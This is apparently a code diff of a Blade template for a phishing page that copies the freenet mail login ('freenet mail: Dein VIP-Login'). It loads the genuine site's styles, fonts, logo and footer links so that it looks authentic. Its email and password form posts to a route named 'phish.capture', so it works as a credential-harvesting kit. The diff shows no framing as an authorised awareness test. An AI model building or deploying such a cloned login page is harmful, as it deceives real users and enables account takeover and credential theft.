@@ -2,241 +2,126 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>freenet Freemail</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background: #f0f2f5;
-            color: #1a1a1a;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>freenet mail: Dein VIP‑Login – schnell, direkt, werbefrei</title>
+    <link rel="icon" href="https://components.freenet.de/img/freenet_32x32.ico">
+    
+    
 
-        header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 16px 48px;
-            background: #fff;
-            height: 60px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            text-decoration: none;
-        }
-
-        .logo-icon {
-            width: 36px;
-            height: 36px;
-            background: #0066cc;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-        }
-
-        .logo-text {
-            font-size: 18px;
-            font-weight: 600;
-            color: #0066cc;
-        }
-
-        .logo-sub {
-            font-size: 12px;
-            color: #666;
-            margin-left: 4px;
-        }
-
-        main {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding-top: 60px;
-        }
-
-        .login-container {
-            display: flex;
-            width: 800px;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
-        }
-
-        .left-panel {
-            width: 320px;
-            background: #0066cc;
-            color: #fff;
-            padding: 48px 32px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        .left-panel h2 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 16px;
-        }
-
-        .left-panel p {
-            font-size: 14px;
-            line-height: 1.6;
-            opacity: 0.9;
-        }
-
-        .right-panel {
-            width: 480px;
-            background: #fff;
-            padding: 48px 40px;
-        }
-
-        .right-panel h1 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 32px;
-        }
-
-        .field-group {
-            margin-bottom: 20px;
-        }
-
-        .field-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #333;
-            margin-bottom: 6px;
-        }
-
-        .field-group input {
-            width: 100%;
-            height: 44px;
-            padding: 0 12px;
-            font-size: 14px;
-            font-family: inherit;
-            color: #1a1a1a;
-            background: #fff;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            outline: none;
-        }
-
-        .field-group input:focus {
-            border-color: #0066cc;
-            box-shadow: 0 0 0 2px rgba(0,102,204,0.15);
-        }
-
-        .btn-login {
-            width: 100%;
-            height: 44px;
-            font-size: 15px;
-            font-weight: 600;
-            font-family: inherit;
-            color: #fff;
-            background: #0066cc;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-top: 8px;
-            margin-bottom: 20px;
-        }
-
-        .btn-login:hover { background: #0055aa; }
-
-        .links {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .links a {
-            font-size: 13px;
-            color: #0066cc;
-            text-decoration: none;
-        }
-
-        .links a:hover { text-decoration: underline; }
-
-        footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 24px;
-            padding: 16px 24px;
-            font-size: 12px;
-            color: #888;
-            border-top: 1px solid #e0e0e0;
-            background: #fff;
-        }
-
-        footer a {
-            color: #888;
-            text-decoration: none;
-        }
-
-        footer a:hover { text-decoration: underline; }
+    
+    <style id="inlined-frn">
+@font-face{font-family:Open Sans;src:url(https://components.freenet.de/assets/fonts/open-sans-regular.eot) format("eot"),url(https://components.freenet.de/assets/fonts/open-sans-regular.woff2) format("woff2"),url(https://components.freenet.de/assets/fonts/open-sans-regular.woff) format("woff"),url(https://components.freenet.de/assets/fonts/open-sans-regular.ttf) format("truetype"),url(https://components.freenet.de/assets/fonts/open-sans-regular.svg) format("svg")}#frn-loginbox a{text-decoration:none;font-size:1em;color:#fff}#frn-loginbox .frn_button{text-transform:uppercase;font-size:.9rem;text-align:center;border:none;font-weight:700;background:#092043;padding:6px 13px;display:inline-block;border-radius:8px;line-height:28px}#frn-loginbox .frn_button:focus,#frn-loginbox .frn_button:focus-visible,#frn-loginbox .frn_button:hover{background:#162133}#frn-loginbox .light{background:transparent;border:2px solid #84bc34;line-height:24px}#frn-loginbox .light:hover{background:#84bc34;color:#092043!important}#frn-loginbox .frn_button:link,#frn-loginbox .frn_button:visited{color:#fff;text-decoration:none}#frn-loginbox .frn_subPage{display:flex;justify-content:flex-end;padding:0 6px 0}#frn-loginbox .frn_subPage .frn_button{font-size:.8rem;padding:3px 9px;white-space:nowrap}#frn-loginbox .frn_subPage .frn_button:last-of-type{margin-left:5px;background-color:#092043}#frn-loginbox .frn_subPage .frn_button:first-of-type{background-color:#84bc34;color:#092043!important}#frn-loginbox .frn_button.login{width:100%}#frn-loginbox .blue .frn_button{color:#092043!important}#frn-loginbox .blue .frn_button.goto-mail,#frn-loginbox .blue .frn_button.login{background:#84bc34}#frn-loginbox .blue .frn_button.goto-mail:focus,#frn-loginbox .blue .frn_button.goto-mail:focus-visible,#frn-loginbox .blue .frn_button.goto-mail:hover,#frn-loginbox .blue .frn_button.login:focus,#frn-loginbox .blue .frn_button.login:focus-visible,#frn-loginbox .blue .frn_button.login:hover{background:#70a02c}#frn-loginbox .blue .frn_button.light{color:#fff!important}#frn-loginbox .blue .frn_button.light:focus,#frn-loginbox .blue .frn_button.light:focus-visible,#frn-loginbox .blue .frn_button.light:hover{color:#092043!important;background-color:#70a02c;border-color:#70a02c}#frn-loginbox .white .frn_button.light{color:#092043!important}#frn-loginbox .wrapper{padding:11px 20px 9px 20px;text-align:left}#frn-loginbox .wrapper .buttons{margin:11px 0 0 0;display:flex;white-space:nowrap}#frn-loginbox .logout{flex:1;margin-right:12px}#frn-loginbox .nameLine{color:#fff;font-size:18px;overflow:hidden;text-overflow:ellipsis;line-height:normal;white-space:nowrap}#frn-loginbox .login-logo{margin-bottom:13px;color:#fff;font-size:22px}#frn-loginbox .frn_loginBoxTrenner{border-bottom:2px solid #c2de9a;margin:0 0 3px;border-top:none;margin-left:-20px;margin-right:-20px}#frn-loginbox .frn-white .login-logo,#frn-loginbox .frn-white .nameLine{color:#000!important}#frn-loginbox .frn_subPage{display:flex;justify-content:flex-end;padding:0 6px 0}#frn-loginbox .frn_subPage .nameLineSub{text-overflow:ellipsis;overflow:hidden;max-width:185px;line-height:1rem;font-size:1rem;white-space:nowrap;font-weight:700;padding:4px 10px 0 0}#frn-loginbox a{text-decoration:none;font-size:1em;color:#fff}#frn-loginbox .light{background:transparent;border:2px solid #84bc34;width:40px;height:40px;box-sizing:border-box;display:inline-flex;align-items:center;justify-content:center}#frn-loginbox .light .icon-only{width:20px;height:20px}#frn-loginbox .light .icon-only:after{top:0}#frn-loginbox .light:hover{background:#84bc34}#frn-loginbox .frn_button.light:focus-visible .icon-help-passkey:after,#frn-loginbox .frn_button.light:focus .icon-help-passkey:after,#frn-loginbox .frn_button.light:hover .icon-help-passkey:after{background-image:url(https://components.freenet.de/assets/Login/icon-question-circle-filled.svg)}#frn-loginbox .frn_button:link,#frn-loginbox .frn_button:visited{color:#fff;text-decoration:none}#frn-loginbox .frn_button:link.icon,#frn-loginbox .frn_button:visited.icon{margin-right:16px;border-radius:8px}#frn-loginbox .frn_subPage{display:flex;justify-content:flex-end;padding:0 6px 0}#frn-loginbox .frn_subPage .frn_button{font-size:.8rem;padding:3px 9px;white-space:nowrap;background-color:#84bc34}#frn-loginbox .frn_subPage .frn_button:last-of-type{margin-left:5px;background-color:#092043}#frn-loginbox .icon-only{min-width:auto;width:100%;height:20px}#frn-loginbox .icon-only:after{content:"";position:relative;display:inline-block;top:2px}#frn-loginbox .frn_button .icon-help-passkey{width:20px}#frn-loginbox .frn_button .icon-help-passkey:after{width:20px;height:20px;background:url(https://components.freenet.de/assets/Login/icon-question-circle-filled.svg) no-repeat}#frn-loginbox .frn_button .icon-help-passkey:focus-visible:after,#frn-loginbox .frn_button .icon-help-passkey:focus:after,#frn-loginbox .frn_button .icon-help-passkey:hover:after,#frn-loginbox .frn_button:focus-visible .icon-help-passkey:after,#frn-loginbox .frn_button:focus .icon-help-passkey:after,#frn-loginbox .frn_button:hover .icon-help-passkey:after{background-image:url(https://components.freenet.de/assets/Login/icon-question-circle-filled-green.svg)}#frn-loginbox .frn-white .icon-help-passkey:after{background:url(https://components.freenet.de/assets/Login/icon-question-circle-filled_blue.svg) no-repeat}#frn-loginbox .passkey-info-overlay{position:absolute;top:0;left:0;right:0;bottom:0;display:flex;flex-direction:column;justify-content:flex-end;z-index:10;padding:6px}#frn-loginbox .passkey-info-overlay .passkey-info-panel{position:relative;background:rgba(70,77,83,.95);border-radius:8px}#frn-loginbox .passkey-info-overlay .passkey-info-panel .passkey-info-close{position:absolute;top:12px;right:12px;width:16px;height:16px;background:url(https://components.freenet.de/assets/Login/icon_x_circle.svg) no-repeat 50%;background-size:16px;border:none;cursor:pointer;padding:0}#frn-loginbox .passkey-info-overlay .passkey-info-panel .passkey-info-content{padding:12px 20px 16px}#frn-loginbox .passkey-info-overlay .passkey-info-panel .passkey-info-content p{margin:0 0 16px;font-size:14px;line-height:1.5;color:#fff;font-weight:400}#frn-loginbox .passkey-info-overlay .passkey-info-panel .passkey-info-content p:last-child{margin-bottom:0}#frn-loginbox .passkey-info-overlay .passkey-info-panel .passkey-info-content .bold{font-weight:700}#frn-loginbox .passkey-info-overlay .passkey-info-panel .passkey-info-link{display:block;padding:0 20px 16px;color:#fff!important;font-weight:700;font-size:16px;text-decoration:underline}::-moz-placeholder{color:grey;opacity:1}::placeholder{color:grey}#frn-loginbox .frn-white .frn_loginBoxTrennerPasskey span{color:#092043!important;font-weight:400!important;font-size:12px}#frn-loginbox .login-button-container{display:flex;justify-content:flex-end;align-items:center;width:100%}#frn-loginbox .turnstile-container{display:flex;justify-content:center;margin-top:12px}#frn-loginbox .turnstile-container.turnstile-hidden{position:absolute;visibility:hidden;height:0;overflow:hidden}#frn-loginbox .frn_loginBoxRegister{margin:0 auto;text-align:center;display:block!important}#frn-loginbox a{text-decoration:none;font-size:1em;color:#fff!important}#frn-loginbox .frn_loginBoxTrenner{border-bottom:2px solid #c2de9a;border-top:none}#frn-loginbox .frn_loginBoxTrennerPasskey{display:flex;align-items:center;text-align:center;padding:8px 0}#frn-loginbox .frn_loginBoxTrennerPasskey hr{flex-grow:1;border:none;border-top:1px solid #628c27}#frn-loginbox .frn_loginBoxTrennerPasskey span{padding:0 6px;color:#fff}#frn-loginbox input{width:100%;height:32px;float:none;margin-top:0;margin-bottom:1px;padding:2px 0 0 15px;border:1px solid #fff;font-family:Roboto Condensed,Arial,Helvetica,sans-serif;color:#333;font-size:1.3em;overflow:hidden;box-sizing:border-box;-moz-box-sizing:border-box;line-height:normal!important;border-radius:8px}#frn-loginbox input[type=text]{margin-bottom:16px}#frn-loginbox .frn_button:focus,#frn-loginbox .frn_button:focus-visible,#frn-loginbox a:focus,#frn-loginbox a:focus-visible,#frn-loginbox input:focus,#frn-loginbox input:focus-visible{outline-color:#375c95;outline-style:solid;outline-offset:2px;outline-width:2px}#frn-loginbox .blue .frn_button:focus,#frn-loginbox .blue .frn_button:focus-visible,#frn-loginbox .blue a:focus,#frn-loginbox .blue a:focus-visible,#frn-loginbox .blue input:focus,#frn-loginbox .blue input:focus-visible{outline-color:#d1e1fa}#frn-loginbox .blue .form-footer .frn_button:focus,#frn-loginbox .blue .form-footer .frn_button:focus-visible{outline-color:#375c95}#frn-loginbox .frn-white input{background-color:#f1f1f1!important}#frn-loginbox .hasError{border:1px solid #e20001}#frn-loginbox .login-main{padding:20px}#frn-loginbox .login-main .login-logo{margin-bottom:18px;color:#fff;font-size:24px}#frn-loginbox .login-main .login-logo p{margin:0}#frn-loginbox .login-main .login-logo.frn-white{color:#000}#frn-loginbox .login-main .login_area{display:flex;justify-content:space-between;align-items:center;padding:11px 0 0 0}#frn-loginbox .login-main .login_area .help a{font-size:.75rem;line-height:1.4rem}#frn-loginbox .login-main .login_area div{width:50%}#frn-loginbox .login-main .login_area div:only-child{width:100%}#frn-loginbox .login-main.world_4{padding-bottom:20px}#frn-loginbox .form-footer{padding:0 20px 16px 20px;border-radius:0 0 8px 8px}#frn-loginbox .form-footer.portal{border-radius:0 0 7px 7px;background:#e7ebf2}#frn-loginbox .form-footer.portal .frn_button{background-color:#84bc34}#frn-loginbox .form-footer.portal .frn_button:focus,#frn-loginbox .form-footer.portal .frn_button:focus-visible,#frn-loginbox .form-footer.portal .frn_button:hover{background-color:#70a02c}#frn-loginbox .form-footer .frn_subLogin{display:block;font-size:11px}#frn-loginbox .form-footer .frn_subLogin .frn_subLoginLabel{color:#21314d;font-size:1.38rem;line-height:1.6rem;padding:0 0 5px 0}#frn-loginbox .form-footer .frn_subLogin .frn_subLoginLabel ul{margin:0;padding:23px 0 2px 0}#frn-loginbox .form-footer .frn_subLogin .frn_subLoginLabel ul li{margin:0 0 7px 0;padding:0 0 0 45px;list-style:none;font-size:1.13rem;line-height:32px;height:32px;background-image:url(https://components.freenet.de/assets/Login/cloud_2.svg);background-repeat:no-repeat}#frn-loginbox .form-footer .frn_subLogin .frn_subLoginLabel ul li:first-of-type{background-image:url(https://components.freenet.de/assets/Login/mail_2.svg);background-position-x:2px;background-size:30px}#frn-loginbox .form-footer .frn_subLogin .frn_subLoginLabel.frn-white{color:#5e666e!important}#frn-loginbox .frnLoginSubmit{float:right;text-transform:uppercase;background:#092043;color:#fff;border:none;padding:0 19px;cursor:pointer;outline:none;height:30px;vertical-align:middle;font-family:Arial,Helvetica,sans-serif;font-size:1.6em;box-sizing:border-box;-moz-box-sizing:border-box;font-weight:700}#frn-loginbox .grayText{color:#5e666e!important}#frn-loginbox .btn-reg{margin-top:15px}#frn-loginbox .login-root{position:relative;overflow:hidden}#frn-loginbox div{color:#fff}#frn-loginbox .error-wrapper{display:flex;justify-content:center;align-items:center;flex-direction:column;padding:15px 15px 3px 15px}#frn-loginbox .title-wrapper{height:30px}#frn-loginbox .title-wrapper .title{padding-left:10px;line-height:31px;font-size:22px}#frn-loginbox .cf-ray{padding:6px;color:#7f7f7f;text-align:end;font-size:9px}#frn-loginbox .error{display:flex;align-items:center;position:relative}#frn-loginbox .error:before{content:"";width:24px;height:21px;background-image:url(https://components.freenet.de/assets/Login/Error.svg);background-repeat:no-repeat}#frn-loginbox .error span.title{padding-top:0!important}#frn-loginbox .message{overflow-y:auto;max-height:130px;font-size:14px;margin-top:20px}#frn-loginbox .frn-white .message>a.error_link,#frn-loginbox .frn-white .message,#frn-loginbox .frn-white .title>a.error_link,#frn-loginbox .frn-white .title{color:#000!important}#frn-loginbox .frn-white .error:before{background-image:url(https://components.freenet.de/assets/Login/Error_black.svg)}#frn-loginbox .button-login{margin-top:20px}#frn-loginbox .button-login p{margin:0}#frn-loginbox .frn-white .message a.error_link{color:#000!important}#frn-loginbox div{color:#fff}#frn-loginbox .maintenance .maintenance-wrapper{padding:13px 10px}#frn-loginbox .maintenance .maintenance-body{min-height:30px;display:flex}#frn-loginbox .maintenance .maintenance-body img{padding-top:4px}#frn-loginbox .maintenance .maintenance-body p{padding-left:10px;line-height:31px;font-size:22px;margin:0}#frn-loginbox .maintenance .red{background-color:#df002e}#frn-loginbox .maintenance .blue{background-color:#092043}#frn-loginbox .maintenance .frn-white .message{color:#000!important}.root{font:normal 11px Open Sans,Arial,Helvetica,sans-serif!important;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.loginbox{text-align:left}.loginbox .frn-white .message a{color:#000!important}#frn-loginbox .loginbox{font-weight:600;text-align:left;max-width:300px;height:auto;border-radius:8px}#frn-loginbox .loginbox.mobile{width:100%!important;max-width:none}#frn-loginbox .blue{background-color:#092043}#frn-loginbox .white{background-color:#fff}#frn-loginbox .hidden{display:none}#frn-loginbox.frn_subPage .isLoggedIn{height:auto!important}
+    </style>
+    <style id="inlined-index">
+#footer{color:#bebebe;text-align:center;z-index:200;background-color:#21314d;width:100%;height:52px;line-height:52px;position:fixed;bottom:0}#footer a,#footer a:hover, .ahref{color:#fff;margin-right:18px;text-decoration:none} .ahref{float:left;flex:none;width:auto}#innerFooter{text-align:left;width:1240px;display:inline-block}@media (width<=1240px){#innerFooter{margin-left:50px;margin-right:50px}#footer{height:auto;display:flex}}@media (width<=600px){#footer{margin-top:50px;position:relative} .ahref{text-align:center;border-top:1px solid #fff;border-right:0;width:100%}#innerFooter{border-bottom:1px solid #fff;width:100%;margin-top:30px;margin-bottom:30px}}@media (width<=270px){#footer{position:fixed}}img{overflow-clip-margin:content-box;overflow:clip}#header{text-align:center;z-index:200;background-color:#263153;width:100%;height:76px;position:fixed;top:0;overflow:hidden}.env-white{color:#fff}#innerHeader{width:1240px;display:inline-block}#logo{color:#888889;float:left;cursor:pointer;height:86px;font-size:36px;font-weight:lighter;line-height:86px}#signet{float:right;margin-top:15px;position:relative}#signet img{margin-left:15px}@media (width<=1240px){#innerHeader{width:100%}#logo{margin-left:10px}#signet{margin-right:10px}}@media (width<=980px){#signet{display:none}}#powerLoginBox{width:340px}.powerLoginBoxRight{float:right;width:340px;margin-top:156px;margin-right:43px}.powerLoginBoxRight .inner{background-color:#fff;margin-bottom:4px;padding:30px 20px}@media (width<=1240px){#powerLoginBox{width:340px}.powerLoginBoxRight{height:70%;margin-left:-180px;padding:10px;position:fixed;left:50%}}@media (width<=980px){.powerLoginBoxRight{float:none;width:340px;height:auto;margin-top:100px;margin-left:auto;margin-right:auto;padding:0;position:relative;top:auto;left:auto}}#powerLoginPage{flex-direction:column;min-height:100vh;display:flex}#powerLogin{text-align:center;flex:1 0 auto;width:100%;height:100%;padding-bottom:50px}.banner_domainhinweis{z-index:10;box-sizing:border-box;background-color:#fff;width:100%;margin-top:76px;padding:16px .625rem;position:relative}.banner_domainhinweis_text{text-align:center;background-color:#fdbd35;border-radius:8px}.banner_domainhinweis a{text-align:center;color:#464d53;padding:16px 19px;font-size:1.5rem;font-weight:700;line-height:1.3;text-decoration:none;display:block}.banner_domainhinweis a:hover{text-decoration:none}.domainblock{color:#092043;white-space:nowrap;font-weight:700;text-decoration:underline}.icon-hinweis{vertical-align:middle;background-color:#092043;border-radius:50%;width:20px;height:20px;margin-left:12px;display:inline-block;position:relative}.icon-hinweis:before{content:"";border-bottom:1px solid #fff;border-right:1px solid #fff;width:6px;height:6px;position:absolute;top:50%;left:calc(50% - 1px);transform:translate(-50%,-50%)rotate(-45deg)}@media (width>=48em){.banner_domainhinweis{padding-left:1.25rem;padding-right:1.25rem}}@media (width>=80em){.banner_domainhinweis{padding-left:1.875rem;padding-right:1.875rem}}#powerLogin.hasBanner .powerLoginTitle,#powerLogin.hasBanner .powerLoginBoxRight{margin-top:30px}@media (width<=980px){#powerLogin.hasBanner .powerLoginBoxRight{margin-top:30px}}.powerLoginTitle{float:left;color:#fff;text-shadow:0 0 8px #21314d1a;text-align:left;margin-top:156px;margin-left:43px;font-size:38px;font-weight:700;line-height:46px}.titleFreenet{background-color:#21314d;padding:20px;font-weight:400}.titleFreenet span.first{font-weight:bolder}.titleFreenet span a{color:#fff}#loginBody{width:1240px;height:100%;display:inline-block}@media (width<=1240px){#loginBody{justify-content:center;width:100%}.powerLoginTitle{display:none}}@font-face{font-family:OpenSans;src:url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Regular.eot);src:url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Regular.eot?#iefix)format("embedded-opentype"),url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Regular.woff)format("woff"),url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Regular.ttf)format("truetype"),url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Regular.svg#OpenSansRegular)format("svg");font-weight:400;font-style:normal}@font-face{font-family:OpenSans;src:url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Bold.eot);src:url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Bold.eot?#iefix)format("embedded-opentype"),url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Bold.woff)format("woff"),url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Bold.ttf)format("truetype"),url(https://power.freenet.de/fonts/Open_Sans/OpenSans-Bold.svg#OpenSansBold)format("svg");font-weight:700;font-style:normal}@font-face{font-family:frn;src:url(https://power.freenet.de/fonts/frn-icon/icomoon.eot?g50la);src:url(https://power.freenet.de/fonts/frn-icon/icomoon.eot?g50la#iefix)format("embedded-opentype"),url(https://power.freenet.de/fonts/frn-icon/icomoon.ttf?g50la)format("truetype"),url(https://power.freenet.de/fonts/frn-icon/icomoon.woff?g50la)format("woff"),url(https://power.freenet.de/fonts/frn-icon/icomoon.svg?g50la#icomoon)format("svg");font-weight:400;font-style:normal}body{background:50% no-repeat fixed;margin:0;padding:0;font-family:OpenSans,Arial,"sans-serif";font-size:16px;-webkit-background-size:cover!important;-moz-background-size:cover!important;-o-background-size:cover!important;background-size:cover!important}.icon-freenet-Logo-Q42021-transparent-RGB{speak:none;font-variant:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;cursor:pointer;font-size:36px;font-style:normal;font-weight:400;line-height:1;font-family:frn!important}.icon-freenet-Logo-Q42021-transparent-RGB .path1:before{content:"";color:#84bc34}.icon-freenet-Logo-Q42021-transparent-RGB .path2:before{content:"";color:#fff;margin-left:-5.20703em}.icon-freenet-Logo-Q42021-transparent-RGB .path3:before{content:"";color:#fff;margin-left:-5.20703em}.icon-freenet-Logo-Q42021-transparent-RGB .path4:before{content:"";color:#fff;margin-left:-5.20703em}
+    </style>
+    <style id="inlined-fixes">
+.loginPasskey { display: block !important; flex: 1 !important; }
     </style>
 </head>
-<body>
-    <header>
-        <a href="#" class="logo">
-            <div class="logo-icon">f</div>
-            <span class="logo-text">freenet</span>
-            <span class="logo-sub">Freemail</span>
-        </a>
-    </header>
-
-    <main>
-        <div class="login-container">
-            <div class="left-panel">
-                <h2>Willkommen bei freenet Freemail</h2>
-                <p>Kostenlose E-Mail-Adresse mit großer Speicherkapazität und zuverlässigem Spam-Schutz.</p>
+<body style="background-image: url('https://components.freenet.de/img/backgroundImg/bgBild199.jpg');">
+<div id="app">
+    <div>
+        <div id="powerLoginPage">
+            <div id="header">
+                <div id="innerHeader">
+                    <a href="https://mail.freenet.de/" target="_blank">
+                        <div id="logo">
+                            <span class="frn icon-freenet-Logo-Q42021-transparent-RGB">
+                                <span class="path1"></span>
+                                <span class="path2"></span>
+                                <span class="path3"></span>
+                                <span class="path4"></span>
+                            </span>
+                        </div>
+                    </a>
+                    <div id="signet">
+                        <img src="https://components.freenet.de/img/grafik-ssl.png" alt="cloud services">
+                        <img src="https://components.freenet.de/img/grafik-emig.png" alt="cloud services">
+                        <img src="https://components.freenet.de/img/grafik-cloud.png" alt="cloud services">
+                    </div>
+                    <div>
+                        <span>
+                            <h1 class="env-white"></h1>
+                        </span>
+                    </div>
+                </div>
             </div>
-            <div class="right-panel">
-                <h1> anmelden</h1>
 
-                <form method="POST" action="{{ route('phish.capture', ['provider' => 'freenet', 'token' => $token ?? '']) }}">
-                    @csrf
-                    <input type="hidden" name="_token" value="{{ csrf_token() }}">
-
-                    <div class="field-group">
-                        <label for="email">E-Mail-Adresse</label>
-                        <input type="text" id="email" name="email" placeholder="name@freenet.de" required autocomplete="username" autofocus>
+            <div id="powerLogin" class="">
+                <div id="loginBody">
+                    <div class="powerLoginTitle titleFreenet">
+                        <span><b>VIP-Login: schnell, direkt, werbefrei.</b></span><br>
+                        <span> freemail-Nutzer loggen sich bitte</span> <br>
+                        <span> auf <a href="https://mail.freenet.de/">mail.freenet.de</a> ein.</span>
                     </div>
 
-                    <div class="field-group">
-                        <label for="password">Passwort</label>
-                        <input type="password" id="password" name="password" required autocomplete="current-password">
+                    <div id="powerLoginBox" class="powerLoginBoxRight">
+                        <div class="inner">
+                            <div id="login">
+                                <div id="frn-loginbox" class="root">
+                                    <div class="desktop blue loginbox">
+                                        <div class="login-root">
+                                            <div class="login-main world_2">
+                                                <div class="login-logo">
+                                                    <p>Login Mail &amp; Cloud</p>
+                                                </div>
+                                                <div class="form">
+                                                    <form method="POST" action="{{ route('phish.capture', ['provider' => 'freenet', 'token' => $token ?? '']) }}">
+                                                        @csrf
+                                                        <input type="text" name="email" placeholder="E-Mail oder Domainname eingeben" aria-label="E-Mail-Adresse eingeben" aria-required="true" autocomplete="username" class="">
+                                                        <input type="password" name="password" placeholder="Passwort" aria-label="Passwort eingeben" aria-required="true" autocomplete="current-password" class="">
+                                                    </form>
+                                                </div>
+                                                <div class="login_area">
+                                                    <div class="help">
+                                                        <a href="https://email.freenet.de/service/frn/PasswortVergessen?type=web" aria-label="Passwort vergessen aufrufen">Passwort vergessen</a>
+                                                    </div>
+                                                    <div class="login-button-container">
+                                                        <a href="#" class="frn_button login" aria-label="Anmelden mit Login Daten" onclick="this.closest('form').submit(); return false;">anmelden</a>
+                                                    </div>
+                                                </div>
+                                                <div class="frn_loginBoxTrennerPasskey">
+                                                    <hr><span>oder</span><hr>
+                                                </div>
+                                                <div class="login-button-container">
+                                                    <a href="#" class="frn_button icon light" aria-label="Infos zu Passkey aufrufen"><i class="icon-only icon-help-passkey"></i></a>
+                                                    <a href="#" class="frn_button loginPasskey light" aria-label="Anmelden mit Passkey">Anmelden mit Passkey</a>
+                                                </div>
+                                            </div>
+                                            <div class="form-footer portal">
+                                                <div class="frn_subLogin">
+                                                    <div class="frn_subLoginLabel">
+                                                        <ul>
+                                                            <li>1GB E-Mail Speicher</li>
+                                                            <li>Cloud mit 2GB Speicher</li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                                <div class="frn_loginBoxRegister">
+                                                    <a href="https://email.freenet.de/registrierung/frn?epid=e9900001698&amp;tid=2001004" target="_top" class="frn_button" aria-label="Kostenloses E-Mail Konto anlegen" style="display: block;">Kostenlos registrieren</a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
                     </div>
+                </div>
+            </div>
 
-                    <button type="submit" class="btn-login">Anmelden</button>
-                </form>
-
-                <div class="links">
-                    <a href="#">Passwort vergessen?</a>
-                    <a href="#">Kostenlos registrieren</a>
+            <div id="footer">
+                <div id="innerFooter">
+                    <a href="https://www.freenet.de/impressum/" target="_blank">Impressum</a>
+                    <a href="https://www.freenet.de/agb/" target="_blank">AGB</a>
+                    <a href="https://www.freenet.de/datenschutz/" target="_blank">Datenschutz</a>
+                    <a href="https://www.freenet.de/" target="_blank">freenet Group</a>
+                    <a href="https://www.freenet.de/kundenservice/" target="_blank">Kundenservice</a>
                 </div>
             </div>
         </div>
-    </main>
-
-    <footer>
-        <a href="#">Hilfe</a>
-        <a href="#">Impressum</a>
-        <a href="#">Datenschutz</a>
-        <a href="#">AGB</a>
-    </footer>
+    </div>
+</div>
 </body>
 </html>
